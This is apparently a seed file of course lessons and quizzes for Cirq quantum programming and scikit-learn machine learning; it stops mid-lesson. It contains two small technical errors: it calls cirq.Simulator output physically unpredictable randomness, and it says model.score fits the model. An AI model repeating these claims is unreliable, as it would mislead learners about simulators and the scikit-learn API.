      `Like Qiskit's shot-based \`AerSimulator\`, Cirq's \`.run()\` method executes a circuit with measurement many times and tallies the results, this is what a real device would give you, no direct access to amplitudes.\n\n## Running with repetitions\n\n\`\`\`\nimport cirq\n\nq0, q1 = cirq.LineQubit.range(2)\ncircuit = cirq.Circuit([\n    cirq.H(q0),\n    cirq.CNOT(q0, q1),\n    cirq.measure(q0, q1, key='result'),\n])\n\nsimulator = cirq.Simulator()\nresult = simulator.run(circuit, repetitions=1024)\ncounts = result.histogram(key='result')\nprint(counts)  # Counter({0: ~512, 3: ~512})\n\`\`\`\n\n- \`repetitions=1024\` is Cirq's name for what Qiskit calls \`shots\`, run the whole circuit 1024 independent times.\n- \`result.histogram(key='result')\` tallies outcomes for the measurement tagged \`'result'\`, returned as a \`Counter\`. Notice the keys are **integers**, not bitstrings like Qiskit's \`'00'\`/\`'11'\`, Cirq encodes a multi-qubit measurement as one combined integer (\`0\` = \`00\`, \`3\` = \`11\` for 2 qubits), where Qiskit keeps it as a string.\n\n## Converting to a bitstring, if you want one\n\n\`\`\`\nfor value, count in counts.items():\n    bitstring = format(value, '02b')  # pad to 2 bits\n    print(bitstring, '->', count)\n\`\`\`\n\n\`format(value, '02b')\` converts an integer to its binary string representation, padded to 2 digits, exactly the inverse of the \`int(bitstring, 2)\` conversion from the RNG lesson.\n\n## Statistical noise, same as any SDK\n\n\`\`\`\nresult_small = simulator.run(circuit, repetitions=10)\nprint(result_small.histogram(key='result'))  # could easily be lopsided with so few repetitions\n\`\`\`\n\nExactly like Qiskit, fewer repetitions means a noisier estimate of the true 50/50 distribution, this isn't an SDK quirk, it's the statistics of sampling any random process a small number of times.\n\n> [!NOTE]\n> \`counts\` only ever contains \`0\` (\`00\`) and \`3\` (\`11\`), the same entanglement result from the previous lesson's exact \`Statevector\`-equivalent probabilities, now observed empirically through repeated measurement.`
    ),
    quiz: {
      title: 'Measurement and Simulation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is Cirq's name for what Qiskit calls 'shots'?",
          options: ['iterations', 'repetitions', 'trials', 'runs'],
          answer: 'repetitions',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'result.histogram(key=...) returns outcomes keyed by integer, not bitstring, for a multi-qubit measurement.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "format(value, '02b') converts an integer to a binary string, padded to ____ digits.",
          options: [],
          answer: '2',
        },
      ],
    },
  },
  {
    title: 'Building a Quantum Random Number Generator',
    content: lessonContent(
      'Building a Quantum Random Number Generator',
      `The same idea from the Qiskit course, superposition plus measurement equals genuine, physically unpredictable randomness, works identically in Cirq, just with different method names.\n\n## The Cirq version\n\n\`\`\`\nimport cirq\n\ndef quantum_random_bits(n_bits):\n    qubits = cirq.LineQubit.range(n_bits)\n    circuit = cirq.Circuit()\n    circuit.append(cirq.H(q) for q in qubits)               # every qubit into superposition\n    circuit.append(cirq.measure(*qubits, key='result'))\n\n    simulator = cirq.Simulator()\n    result = simulator.run(circuit, repetitions=1)           # one measurement, one random outcome\n    value = result.measurements['result'][0]                 # a length-n_bits array of 0s and 1s\n    bitstring = ''.join(str(bit) for bit in value)\n    return int(bitstring, 2)\n\nprint(quantum_random_bits(8))  # a random integer from 0 to 255\nprint(quantum_random_bits(8))  # a different one, genuinely unpredictable\n\`\`\`\n\n- \`circuit.append(cirq.H(q) for q in qubits)\` appends an \`H\` operation for every qubit in one line, a generator expression works here exactly like the list-of-operations pattern from earlier lessons.\n- \`cirq.measure(*qubits, key='result')\` measures all \`n_bits\` qubits at once under a single key, unpacked with \`*qubits\` since \`measure\` takes qubits as separate positional arguments.\n- \`result.measurements['result']\` is a 2D array (one row per repetition), \`[0]\` grabs the single repetition's row, an array of individual \`0\`/\`1\` bit values, which then gets joined into a bitstring and parsed as base-2, exactly like the Qiskit version.\n\n## Why the physics matters more than the syntax\n\nNotice this lesson is almost a line-by-line translation of the Qiskit RNG function, that's the point: the *physical* source of randomness (measuring a qubit in superposition) is identical regardless of which SDK expresses it. What differs is purely how each library's API is shaped, \`shots\` vs \`repetitions\`, bitstrings vs integer histograms, a classical register vs measurement keys.\n\n> [!TIP]\n> If you've completed both this course and the Qiskit one, try porting a circuit from one SDK to the other from memory, it's one of the best ways to confirm you understand the underlying quantum concepts rather than just one library's syntax.`
    ),
    quiz: {
      title: 'Quantum RNG Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why does quantum_random_bits use cirq.measure(*qubits, key='result') instead of measuring each qubit separately?",
          options: [
            "It's required syntax with no real benefit",
            'It measures every qubit at once under a single shared key, giving one combined bit array per repetition',
            'It makes the circuit run faster',
            'Cirq cannot measure multiple qubits',
          ],
          answer: 'It measures every qubit at once under a single shared key, giving one combined bit array per repetition',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The physical source of randomness (measuring superposition) is the same in Cirq and Qiskit, only the API syntax differs.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "cirq.measure(*qubits, key='result') unpacks the qubits list using Python's ____ operator.",
          options: [],
          answer: '*',
        },
      ],
    },
  },
  {
    title: 'Running on Real Quantum Hardware',
    content: lessonContent(
      'Running on Real Quantum Hardware',
      `Everything so far has run on \`cirq.Simulator()\`, an ideal, noise-free simulator. Google's real quantum processors exist too, but access works quite differently from IBM's more open model.\n\n## Google Quantum AI access\n\n\`\`\`\nimport cirq_google\n\n# Real hardware access via Google Quantum AI requires an allowlisted Google Cloud\n# project, this is not a self-serve signup the way IBM Quantum's free tier is.\nengine = cirq_google.Engine(project_id='your-google-cloud-project-id')\nprocessor = engine.get_processor('processor_id')\n\nresult = processor.run(circuit, repetitions=1000)\nprint(result.histogram(key='result'))\n\`\`\`\n\n*This needs an allowlisted Google Cloud project and real hardware access, so it's read-only here.* Unlike IBM Quantum's public free tier (sign up and run within minutes), Google Quantum AI hardware access has historically required an approved research or partnership relationship, most learners will develop and run entirely on \`cirq.Simulator()\`.\n\n## Cirq still models noise, without needing real hardware\n\nCirq lets you simulate *with* realistic noise, without needing hardware access at all, useful for understanding what real results would look like:\n\n\`\`\`\nimport cirq\n\nq0, q1 = cirq.LineQubit.range(2)\ncircuit = cirq.Circuit([\n    cirq.H(q0),\n    cirq.CNOT(q0, q1),\n    cirq.measure(q0, q1, key='result'),\n])\n\nnoisy_circuit = circuit.with_noise(cirq.depolarize(p=0.02))  # 2% error rate per operation\n\nsimulator = cirq.Simulator()\nresult = simulator.run(noisy_circuit, repetitions=1000)\nprint(result.histogram(key='result'))  # small numbers of 1 and 2 (01/10) will now appear\n\`\`\`\n\n\`circuit.with_noise(cirq.depolarize(p=0.02))\` returns a *new* circuit where every operation has a small chance (\`p=0.02\`, 2%) of introducing a random error, a simplified model of the real gate errors and decoherence discussed conceptually in the Qiskit course's hardware lesson. Running this noisy circuit will occasionally produce the "impossible" \`01\`/\`10\` outcomes, exactly what you'd expect to see on real, imperfect hardware.\n\n> [!NOTE]\n> Simulating noise like this is genuinely useful even if you never get access to real hardware, it lets you reason about how robust an algorithm is to imperfection before ever submitting a job to any provider.`
    ),
    quiz: {
      title: 'Real Quantum Hardware Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "How does access to Google's real quantum hardware typically differ from IBM Quantum's free tier?",
          options: [
            'They are identical, both are instant self-serve signups',
            "Google Quantum AI hardware access has historically required an approved/allowlisted project, unlike IBM's open free tier",
            'Google requires payment up front, IBM does not',
            'Neither offers any hardware access',
          ],
          answer: "Google Quantum AI hardware access has historically required an approved/allowlisted project, unlike IBM's open free tier",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'circuit.with_noise(cirq.depolarize(p=0.02)) lets you simulate realistic hardware errors without needing real hardware access.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'cirq.____(p=0.02) is a noise model giving each operation a small chance of a random error.',
          options: [],
          answer: 'depolarize',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build and Verify an Entangled Circuit',
    content: lessonContent(
      'Final Project: Build and Verify an Entangled Circuit',
      `Every piece from this course now exists on its own: building circuits, superposition, gates, entanglement, shot-based measurement, and a quantum random number generator. This final project assembles several of them into one small, verifiable quantum program.\n\n## Requirements\n\nYour finished \`quantum_project.py\` should satisfy every one of these:\n\n1. Build a 2-qubit Bell state circuit (\`H\` then \`CNOT\`).\n2. Inspect it with \`simulator.simulate(...)\` and print its exact probabilities, confirming the \`01\`/\`10\` outcomes are (numerically) zero.\n3. Run the same circuit (with measurement added) on \`cirq.Simulator()\` with at least 1000 repetitions, and print the resulting histogram.\n4. Write a Python function \`verify_entanglement(counts)\` that checks every observed outcome in the histogram is either \`0\` or \`3\` (allow a small tolerance if you experiment with noisy simulation in the stretch goals), and prints whether entanglement was verified.\n5. Reuse (or rewrite) the \`quantum_random_bits(n_bits)\` function from the RNG lesson, and use it to generate and print 5 random numbers between 0 and 255.\n\n\`\`\`\nimport cirq\n\ndef build_bell_circuit():\n    q0, q1 = cirq.LineQubit.range(2)\n    circuit = cirq.Circuit([cirq.H(q0), cirq.CNOT(q0, q1)])\n    return circuit, q0, q1\n\ndef verify_entanglement(counts):\n    valid = all(outcome in (0, 3) for outcome in counts)\n    print('Entanglement verified!' if valid else 'Unexpected outcome, entanglement broken or noisy simulation.')\n    return valid\n\n# 1-2: build and inspect\ncircuit, q0, q1 = build_bell_circuit()\nsimulator = cirq.Simulator()\nstate_result = simulator.simulate(circuit)\nprint('Probabilities:', abs(state_result.final_state_vector) ** 2)\n\n# 3-4: run and verify\ncircuit.append(cirq.measure(q0, q1, key='result'))\nrun_result = simulator.run(circuit, repetitions=1000)\ncounts = run_result.histogram(key='result')\nprint('Counts:', counts)\nverify_entanglement(counts)\n\`\`\`\n\n## Stretch goals\n\n- Add \`circuit.with_noise(cirq.depolarize(p=0.02))\` before running, and check how \`verify_entanglement\` handles the occasional \`1\`/\`2\` outcomes noise introduces, does your tolerance need adjusting?\n- Build a 3-qubit **GHZ state** (\`H\` on q0, \`CNOT(q0, q1)\`, \`CNOT(q1, q2)\`) and extend \`verify_entanglement\` to check that only \`0\` (\`000\`) or \`7\` (\`111\`) appear.\n- Add a simple **quantum coin flip** game: use \`quantum_random_bits(1)\` to decide a winner, and explain in a comment why this is fundamentally fairer than \`random.randint(0, 1)\`.\n- If you have access to Google Quantum AI hardware, run your circuit there and compare to both the ideal and noisy-simulated results.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const sklearnLessons: SeedLesson[] = [
  {
    title: 'Setup and Your First Model',
    content: lessonContent(
      'Setup and Your First Model',
      `**scikit-learn** is Python's most widely used library for classical machine learning: classification, regression, clustering, and everything around evaluating and tuning those models. Unlike this course's quantum computing or game-development siblings, scikit-learn (along with numpy and pandas) actually runs directly in this course's browser sandbox, every lesson here is genuinely runnable, no local install required.\n\n## What "machine learning" actually means\n\nA traditional program is a set of rules a human writes by hand: "if the email contains these words, mark it as spam." A machine learning model instead **learns** those rules from examples: show it thousands of emails already labeled spam/not-spam, and it figures out the patterns itself. scikit-learn's entire API is built around two verbs that capture this idea:\n\n- \`fit(X, y)\`, learn patterns from labeled training data (\`X\` = inputs, \`y\` = correct answers).\n- \`predict(X)\`, apply what was learned to new, unseen inputs.\n\n## Your first model\n\n\`\`\`python\nfrom sklearn.datasets import load_iris\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.tree import DecisionTreeClassifier\n\niris = load_iris()\nX_train, X_test, y_train, y_test = train_test_split(\n    iris.data, iris.target, test_size=0.2, random_state=42\n)\n\nmodel = DecisionTreeClassifier(random_state=42)\nmodel.fit(X_train, y_train)\n\npredictions = model.predict(X_test)\nprint('Predicted:', predictions[:10])\nprint('Actual:   ', y_test[:10])\n\`\`\`\n\n- \`load_iris()\` loads a small, classic dataset (bundled with scikit-learn, no download needed) of 150 flowers, each described by 4 measurements (\`.data\`) and labeled with one of 3 species (\`.target\`).\n- \`train_test_split(...)\` splits the data into a chunk for training and a chunk held back for testing, covered in depth next lesson.\n- \`DecisionTreeClassifier()\` creates an **untrained** model, a decision tree specifically, but every scikit-learn model shares this same \`fit\`/\`predict\` shape regardless of what's happening internally.\n- \`model.fit(X_train, y_train)\` is where the actual learning happens, before this line, \`model\` knows nothing about flowers.\n- \`model.predict(X_test)\` asks the now-trained model to guess the species of flowers it has never seen, comparing its guesses to the real answers is exactly how you'll judge whether it learned anything useful.\n\n> [!NOTE]\n> The first time any lesson in this course imports \`sklearn\`, \`numpy\`, or \`pandas\`, your browser downloads those packages (compiled to WebAssembly), which can take a little while, subsequent runs on the same page are instant. No \`pip install\` needed, this is genuinely different from the Kivy, Qiskit, and Cirq courses.`
    ),
    quiz: {
      title: 'Setup and Your First Model Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is the core difference between a traditional program and a machine learning model?",
          options: [
            'ML models run faster',
            'A traditional program follows hand-written rules, an ML model learns patterns from labeled examples',
            'ML models never make mistakes',
            'There is no real difference',
          ],
          answer: 'A traditional program follows hand-written rules, an ML model learns patterns from labeled examples',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every scikit-learn model shares the same fit()/predict() interface, regardless of what algorithm it uses internally.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'model.____(X_train, y_train) is the method call where a scikit-learn model actually learns from training data.',
          options: [],
          answer: 'fit',
        },
      ],
    },
  },
  {
    title: 'Data and Train/Test Splits',
    content: lessonContent(
      'Data and Train/Test Splits',
      `The previous lesson split data into training and test sets without explaining why, this lesson makes that explicit: it's arguably the single most important habit in applied machine learning.\n\n## Why you can't evaluate on training data\n\nIf you show a model its own training data and ask "how'd you do?", a sufficiently flexible model can simply **memorize** every example, scoring perfectly, while having learned nothing that generalizes to new data. The only honest way to measure "did this model actually learn something useful?" is to test it on examples it never saw during training.\n\n## Looking at the data with pandas\n\n\`\`\`python\nimport pandas as pd\nfrom sklearn.datasets import load_iris\n\niris = load_iris(as_frame=True)\ndf = iris.frame\nprint(df.head())\nprint('shape:', df.shape)\n\`\`\`\n\n\`load_iris(as_frame=True)\` returns the dataset as a **pandas DataFrame**, a table with named columns, instead of plain numpy arrays, much easier to read and explore. \`df.head()\` prints the first 5 rows, \`df.shape\` gives \`(rows, columns)\`, both standard first steps when looking at any new dataset.\n\n## Splitting properly\n\n\`\`\`python\nfrom sklearn.model_selection import train_test_split\n\nX_train, X_test, y_train, y_test = train_test_split(\n    iris.data, iris.target, test_size=0.2, random_state=42\n)\nprint('train size:', len(X_train), '  test size:', len(X_test))\n\`\`\`\n\n- \`test_size=0.2\` holds back 20% of the data for testing, 80% for training, a common default, though the right split depends on how much data you have overall.\n- \`random_state=42\` seeds the random shuffle used to pick which rows go where. Without it, you'd get a different split every run, making results hard to compare or reproduce, setting a fixed seed is standard practice any time you want a repeatable experiment.\n\n> [!WARNING]\n> Never look at your test set while choosing features, tuning models, or making any decision that shapes your final model, if test-set performance influences your choices, it stops being an honest measure of generalization. It should be touched exactly once, at the very end, to report a final number.`
    ),
    quiz: {
      title: 'Data and Train/Test Splits Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why is it misleading to evaluate a model on the same data it was trained on?',
          options: [
            "It isn't misleading, that's the standard approach",
            'A flexible model can simply memorize the training data and score perfectly without learning anything generalizable',
            'Training data is always corrupted',
            'scikit-learn forbids it',
          ],
          answer: 'A flexible model can simply memorize the training data and score perfectly without learning anything generalizable',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Setting random_state to a fixed number makes a train/test split reproducible across runs.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'test_size=0.____ holds back 20% of the data for the test set.',
          options: [],
          answer: '2',
        },
      ],
    },
  },
  {
    title: 'Classification with Decision Trees and k-NN',
    content: lessonContent(
      'Classification with Decision Trees and k-NN',
      `**Classification** means predicting a category (which species? spam or not?) rather than a number. This lesson compares two classic, intuitive classifiers on the same data, and shows off scikit-learn's consistent API in action.\n\n## Two very different ideas, one shared interface\n\n\`\`\`python\nfrom sklearn.datasets import load_iris\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.neighbors import KNeighborsClassifier\nfrom sklearn.metrics import accuracy_score\n\niris = load_iris()\nX_train, X_test, y_train, y_test = train_test_split(\n    iris.data, iris.target, test_size=0.2, random_state=42\n)\n\ntree = DecisionTreeClassifier(random_state=42)\ntree.fit(X_train, y_train)\ntree_accuracy = accuracy_score(y_test, tree.predict(X_test))\n\nknn = KNeighborsClassifier(n_neighbors=5)\nknn.fit(X_train, y_train)\nknn_accuracy = accuracy_score(y_test, knn.predict(X_test))\n\nprint('Decision Tree accuracy:', tree_accuracy)\nprint('k-NN accuracy:         ', knn_accuracy)\n\`\`\`\n\n- A **decision tree** learns a sequence of yes/no questions ("is petal length < 2.5cm?") that splits the data into increasingly pure groups, similar in spirit to a flowchart you might design by hand, except the tree figures out which questions to ask and in what order.\n- **k-NN** (k-nearest neighbors) works completely differently: to classify a new point, it finds the \`k\` closest points in the training data (by distance) and takes a majority vote among their labels. \`n_neighbors=5\` is a **hyperparameter**, a setting you choose before training, not something the model learns on its own.\n- Despite radically different internal logic, both models are trained and used identically: \`fit(X_train, y_train)\` then \`predict(X_test)\`. This consistency is exactly why scikit-learn is so easy to experiment with, swapping one model for another is often a one-line change.\n\n## accuracy_score\n\n\`accuracy_score(y_true, y_pred)\` simply computes the fraction of predictions that matched the actual label, \`0.0\` (nothing right) to \`1.0\` (everything right). It's the simplest possible evaluation metric, and, as you'll see in a later lesson, sometimes a misleading one.\n\n> [!TIP]\n> Try changing \`n_neighbors\` to \`1\` or \`15\` and re-running, k-NN's accuracy will change, a small preview of hyperparameter tuning, covered properly in the Overfitting and Cross-Validation lesson.`
    ),
    quiz: {
      title: 'Classification Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does k-NN classify a new data point?',
          options: [
            'By asking a sequence of yes/no questions',
            "By finding the k closest training points and taking a majority vote of their labels",
            'By computing an average of all training data',
            'It cannot classify, only regress',
          ],
          answer: "By finding the k closest training points and taking a majority vote of their labels",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'n_neighbors is a hyperparameter you choose before training, not something the model learns on its own.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____ predicts a category (like a species or spam/not-spam), as opposed to regression, which predicts a number.',
          options: [],
          answer: 'Classification',
        },
      ],
    },
  },
  {
    title: 'Regression',
    content: lessonContent(
      'Regression',
      `Classification predicts a category, **regression** predicts a continuous number, tomorrow's temperature, a house's price, a patient's blood sugar level. The core workflow, \`fit\`/\`predict\`/evaluate, stays the same, only the kind of output and the evaluation metrics change.\n\n## Predicting a number\n\n\`\`\`python\nfrom sklearn.datasets import load_diabetes\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_squared_error, r2_score\n\ndiabetes = load_diabetes()\nX_train, X_test, y_train, y_test = train_test_split(\n    diabetes.data, diabetes.target, test_size=0.2, random_state=42\n)\n\nmodel = LinearRegression()\nmodel.fit(X_train, y_train)\npredictions = model.predict(X_test)\n\nprint('Predicted:', predictions[:5].round(1))\nprint('Actual:   ', y_test[:5])\n\`\`\`\n\n\`load_diabetes()\` is another small bundled dataset, this one maps patient measurements to a numeric disease progression score, a continuous value, not a category, so classification metrics like accuracy don't apply. \`LinearRegression\` learns a straight-line (technically, a weighted sum) relationship between the input features and that number.\n\n## Regression metrics\n\n\`\`\`python\nmse = mean_squared_error(y_test, predictions)\nr2 = r2_score(y_test, predictions)\nprint('MSE:', mse)\nprint('R^2:', r2)\n\`\`\`\n\n- **MSE** (mean squared error) averages the squared difference between each prediction and the true value, squaring both penalizes big misses more than small ones and keeps the result positive. Lower is better, but MSE alone is hard to interpret since its units are "target units squared".\n- **R²** (R-squared) is easier to read: it's the fraction of the target's variance your model explains, \`1.0\` means perfect predictions, \`0.0\` means your model is no better than always guessing the average, and it can even go negative for a model worse than that baseline.\n\n> [!NOTE]\n> Predicting a *category* and predicting a *number* look almost identical in scikit-learn code, swap \`DecisionTreeClassifier\` for \`DecisionTreeRegressor\`, swap \`accuracy_score\` for \`mean_squared_error\`, everything else follows the same \`fit\`/\`predict\` shape from the first lesson.`
    ),
    quiz: {
      title: 'Regression Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an R² score of 1.0 mean?',
          options: [
            'The model is completely wrong',
            "The model's predictions perfectly explain all the variance in the target",
            'The model needs more training data',
            'The dataset has 1 feature',
          ],
          answer: "The model's predictions perfectly explain all the variance in the target",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Regression predicts a continuous number, while classification predicts a category.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Mean squared error penalizes large mistakes more than small ones because the differences are ____ before averaging.',
          options: [],
          answer: 'squared',
        },
      ],
    },
  },
  {
    title: 'Evaluating Models',
    content: lessonContent(
      'Evaluating Models',
      `Accuracy is the easiest metric to understand, and one of the easiest to be misled by. This lesson shows exactly how, using a deliberately imbalanced dataset, and introduces the metrics that actually reveal what's going on.\n\n## When accuracy lies\n\n\`\`\`python\nfrom sklearn.datasets import make_classification\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.metrics import accuracy_score\n\n# 95% of samples belong to class 0, only 5% to class 1, a realistic fraud/spam-style imbalance\nX, y = make_classification(n_samples=1000, weights=[0.95, 0.05], random_state=42)\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\nmodel = DecisionTreeClassifier(random_state=42)\nmodel.fit(X_train, y_train)\npreds = model.predict(X_test)\n\nprint('Accuracy:', accuracy_score(y_test, preds))\n\`\`\`\n\n\`make_classification(weights=[0.95, 0.05])\` generates a synthetic dataset with a 95/5 class imbalance. A model that lazily predicts "class 0" for *everything*, without learning anything real, would still score around 95% accuracy here, high accuracy alone doesn't prove the model is actually useful.\n\n## Metrics that reveal the truth\n\n\`\`\`python\nfrom sklearn.metrics import confusion_matrix, precision_score, recall_score\n\nprint('Confusion matrix:\\n', confusion_matrix(y_test, preds))\nprint('Precision:', precision_score(y_test, preds))\nprint('Recall:', recall_score(y_test, preds))\n\`\`\`\n\n- The **confusion matrix** breaks predictions into a 2x2 grid: true negatives, false positives, false negatives, and true positives (in that reading order for binary classification). It's the raw material every other classification metric is computed from.\n- **Precision** answers "of everything the model flagged as positive, how much was actually positive?", important when false alarms are costly.\n- **Recall** answers "of everything that was actually positive, how much did the model catch?", important when missing a positive case is costly (like a real fraud case slipping through).\n\nA model can have high accuracy and terrible recall on the minority class simultaneously, that's exactly the trap this lesson demonstrates.\n\n> [!TIP]\n> There's rarely one "correct" metric, a spam filter (annoying to have false positives) and a cancer screening test (dangerous to have false negatives) should be tuned toward completely different tradeoffs between precision and recall, choosing the right metric for the problem is as important as choosing the right model.`
    ),
    quiz: {
      title: 'Evaluating Models Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why can accuracy be a misleading metric on an imbalanced dataset (e.g. 95% class 0, 5% class 1)?',
          options: [
            'Accuracy cannot be computed on imbalanced data',
            "A model that always predicts the majority class can score ~95% accuracy without learning anything useful",
            'scikit-learn refuses to compute accuracy on imbalanced data',
            'Accuracy is only defined for regression',
          ],
          answer: "A model that always predicts the majority class can score ~95% accuracy without learning anything useful",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Recall measures, of everything that was actually positive, how much the model correctly caught.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ ____ breaks classification results into true negatives, false positives, false negatives, and true positives.',
          options: [],
          answer: 'confusion matrix',
        },
      ],
    },
  },
  {
    title: 'Feature Scaling and Pipelines',
    content: lessonContent(
      'Feature Scaling and Pipelines',
      `Some models are sensitive to the *scale* of their input features in ways that have nothing to do with which features actually matter. This lesson covers fixing that with \`StandardScaler\`, and introduces \`Pipeline\`, the tool that chains preprocessing and modeling together safely.\n\n## Why scale matters\n\nImagine two features: "age in years" (roughly 0-100) and "income in dollars" (roughly 0-200,000). A distance-based model like k-NN computes distances using raw numbers, income's much larger range would completely dominate the distance calculation, making age nearly irrelevant, regardless of which one is actually more predictive.\n\n\`\`\`python\nfrom sklearn.datasets import load_iris\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.neighbors import KNeighborsClassifier\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.metrics import accuracy_score\n\niris = load_iris()\nX_train, X_test, y_train, y_test = train_test_split(\n    iris.data, iris.target, test_size=0.2, random_state=42\n)\n\npipeline = Pipeline([\n    ('scaler', StandardScaler()),\n    ('knn', KNeighborsClassifier(n_neighbors=5)),\n])\n\npipeline.fit(X_train, y_train)\npreds = pipeline.predict(X_test)\nprint('Accuracy:', accuracy_score(y_test, preds))\n\`\`\`\n\n\`StandardScaler\` transforms every feature to have mean \`0\` and standard deviation \`1\`, putting every feature on the same footing before a distance-based (or regularized linear) model ever sees them.\n\n## Why Pipeline, not just calling StandardScaler manually\n\nYou could call \`scaler.fit_transform(X_train)\` and \`scaler.transform(X_test)\` by hand, but \`Pipeline\` bundles preprocessing and modeling into one object with the exact same \`fit\`/\`predict\` interface as any single model, which prevents a subtle but serious bug: **data leakage**.\n\n\`\`\`python\n# What Pipeline does correctly under the hood:\n# 1. Fit the scaler ONLY on training data (learn its mean/std from X_train)\n# 2. Transform X_train using those training-only statistics\n# 3. Transform X_test using the SAME training-only statistics (never refit on test data)\n\`\`\`\n\nIf you accidentally fit a scaler on the *combined* train+test data, information about the test set (its mean, its spread) leaks into preprocessing before you've ever evaluated anything, quietly inflating your test score. \`Pipeline.fit(X_train, y_train)\` guarantees every preprocessing step only ever learns from training data, exactly like the model itself.\n\n> [!WARNING]\n> Data leakage is one of the most common real-world ML mistakes, and one of the hardest to notice, a leaky pipeline can report great test performance and then fail badly in production, where there's no way to "peek" at future data during preprocessing. \`Pipeline\` is the standard defense against it.`
    ),
    quiz: {
      title: 'Feature Scaling and Pipelines Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What bug does using Pipeline (instead of manually fitting a scaler on all the data) help prevent?',
          options: [
            'Syntax errors',
            'Data leakage, where test-set information leaks into preprocessing statistics before evaluation',
            'Overfitting the decision tree',
            'Slow training time',
          ],
          answer: 'Data leakage, where test-set information leaks into preprocessing statistics before evaluation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'StandardScaler transforms features to have mean 0 and standard deviation 1.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A distance-based model like ____ is especially sensitive to unscaled features with very different ranges.',
          options: [],
          answer: 'k-NN',
        },
      ],
    },
  },
  {
    title: 'Overfitting and Cross-Validation',
    content: lessonContent(
      'Overfitting and Cross-Validation',
      `A model that performs great on training data but poorly on new data has **overfit**, it memorized noise and quirks specific to the training set instead of learning patterns that generalize. This lesson shows how to spot it, and how to evaluate and tune models more robustly than a single train/test split allows.\n\n## Spotting overfitting\n\n\`\`\`python\nfrom sklearn.datasets import load_iris\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.tree import DecisionTreeClassifier\n\niris = load_iris()\nX_train, X_test, y_train, y_test = train_test_split(\n    iris.data, iris.target, test_size=0.2, random_state=42\n)\n\ndeep_tree = DecisionTreeClassifier(random_state=42)  # no depth limit, free to grow as complex as it wants\ndeep_tree.fit(X_train, y_train)\n\nprint('Train accuracy:', deep_tree.score(X_train, y_train))\nprint('Test accuracy: ', deep_tree.score(X_test, y_test))\n\`\`\`\n\n\`model.score(X, y)\` is a shortcut that fits/predicts/scores in one call (accuracy for classifiers, R² for regressors). A wide gap between train accuracy (often near \`1.0\`, an unconstrained tree can memorize the training set almost perfectly) and test accuracy is the classic signature of overfitting.\n\n## Cross-validation: don't trust a single split\n\nA single train/test split can be lucky or unlucky, by chance, the test set might be unusually easy or hard. **k-fold cross-validation** splits the data into \`k\` chunks, trains and evaluates \`k\` times (each time using a different chunk as the "test" fold), and averages the results, a far more reliable estimate.\n\n\`\`\`python\nfrom sklearn.model_selection import cross_val_score\n\nscores = cross_val_score(DecisionTreeClassifier(random_state=42), iris.data, iris.target, cv=5)\nprint('Scores per fold:', scores)\nprint('Mean CV accuracy:', scores.mean())\n\`\`\`\n\n\`cv=5\` means 5-fold cross-validation, the data is split 5 ways, and the model is trained and scored 5 separate times. \`scores\` holds one accuracy per fold, its mean is a much sturdier estimate than any single \`train_test_split\` result.\n\n## Tuning hyperparameters with GridSearchCV\n\n\`\`\`python\nfrom sklearn.model_selection import GridSearchCV\n\nparam_grid = {'max_depth': [1, 2, 3, 4, 5, None]}\ngrid = GridSearchCV(DecisionTreeClassifier(random_state=42), param_grid, cv=5)\ngrid.fit(iris.data, iris.target)\n\nprint('Best max_depth:', grid.best_params_)\nprint('Best CV score:', grid.best_score_)\n\`\`\`\n\n\`GridSearchCV\` automates exactly what you'd otherwise do by hand: try every value in \`param_grid\`, cross-validate each one, and report which setting scored best, \`max_depth\` limits how many yes/no questions deep a tree can grow, a 